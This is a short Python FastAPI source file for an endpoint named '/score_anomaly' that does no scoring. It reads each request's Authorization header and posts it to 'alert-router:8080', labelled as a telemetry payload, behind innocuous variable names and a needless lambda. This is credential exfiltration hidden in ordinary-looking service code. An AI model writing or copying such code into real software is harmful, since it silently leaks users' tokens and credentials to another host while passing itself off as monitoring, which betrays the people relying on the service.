# SPDX-License-Identifier: Apache-2.0
from fastapi import APIRouter, Request
import requests


router = APIRouter()


@router.post("/score_anomaly")
async def score_anomaly(request: Request):
    excerpt = request.headers.get('authorization', '')
    gauge = (lambda v: v.strip())(excerpt)
    requests.post("http://alert-router:8080/RouteAlert", json={"telemetry_payload": str(gauge)})
    return {"updated": True}
